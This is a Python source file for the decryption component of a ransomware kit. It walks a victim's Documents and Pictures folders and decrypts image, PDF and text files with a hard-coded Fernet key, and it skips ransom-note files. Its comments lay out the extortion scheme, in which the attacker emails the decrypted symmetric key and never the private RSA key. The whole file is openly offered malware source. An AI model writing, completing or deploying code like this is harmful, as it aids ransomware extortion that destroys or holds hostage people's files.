import time
from cryptography.fernet import Fernet # encrypt/decrypt files on target system
import os
import threading




class Decryptsystem:

    file_exts = [
        'jpg', "pdf", "txt", "png"
    ]

    def __init__(self):
        # Key that will be used for Fernet object and encrypt/decrypt method
        self.key = None
        # Encrypt/Decrypter
        self.crypter = None
        # RSA public key used for encrypting/decrypting fernet object eg, Symmetric key
        self.public_key = None



        ''' Root directorys to start Encryption/Decryption from
            CAUTION: Do NOT use self.sysRoot on your own PC as you could end up messing up your system etc...
            CAUTION: Play it safe, create a mini root directory to see how this software works it is no different
            CAUTION: eg, use 'localRoot' and create Some folder directory and files in them folders etc.
        '''
        # Use sysroot to create absolute path for files, etc. And for encrypting whole system
        self.sysRoot = os.path.expanduser('~')
        #Use localroot to test encryption softawre and for absolute path for files and encryption of "test system"
        self.localRoot = f"{self.sysRoot}"  #  Debugging/Testing

    # [SYMMETRIC KEY] Fernet Decrypt file - file_path:str:absolute file path eg, C:/Folder/Folder/Folder/Filename.txt
    def decrypt_file(self, file_path):
        with open(file_path, 'rb') as f:
            # Read data from file
            data = f.read()
            # Decrypt data from file
            _data = self.crypter.decrypt(data)     #THIS LINE BUGGGGGGGGGGGGGGGGGGGGGGGGGGG
            # Log file decrypted and print decrypted contents - [debugging]
            print('> File decrpyted')
            print(_data)
        with open(file_path, 'wb') as fp:
            # Write encrypted/decrypted data to file using same filename to overwrite original file
            fp.write(_data)


    # [SYMMETRIC KEY] Fernet Encrypt/Decrypt files on system using the symmetric key that was generated on victim machine
    def decrypt_system(self):
        list_good_files = ["EMAIL_US_THIS_TO_GET_YOUR_FILES_BACK.txt",'HOW_TO_GET_YOUR_FILES_BACK.txt']
        directory = ["Documents", "Pictures"]  # folders to crypt (target specific folders)
        for i in directory:
            system = os.walk(f"{self.localRoot}/{i}", topdown=True)
            for root, dir, files in system:
                for file in files:
                    if file in list_good_files:
                        continue
                    file_path = os.path.join(root, file)
                    if not file.split('.')[-1] in self.file_exts:
                        continue
                    else:
                        self.decrypt_file(file_path)



    #should always run
    # Decrypts system when text file with un-encrypted key in it is placed on dekstop of target machine
    def decrypter_start(self):
        # Loop to check file and if file it will read key and then self.key + self.cryptor will be valid for decrypting-
        # -the files
        print('started') # Debugging/Testing
        # The ATTACKER decrypts the fernet symmetric key on their machine and then puts the un-encrypted fernet-
        # -key in this file and sends it in a email to victim. They then put this on the desktop and it will be-
        # -used to un-encrypt the system. AT NO POINT DO WE GIVE THEM THE PRIVATE ASSYEMTRIC KEY etc.
        self.key = "ScGVg9U_Ghm79Q1mqiXRZIj7o3AI9dXr4wslPOMpgOA="       #Enter the DECRYPTED_KEY.txt key here
        self.crypter = Fernet(self.key)
        # Decrypt system once have file is found and we have cryptor with the correct key
        self.decrypt_system()
        print('decrypted\nBomb has been defused!') # Debugging/Testing
        return 0

def main():
    rw = Decryptsystem()
    rw.decrypter_start()


if __name__ == '__main__':
    main()





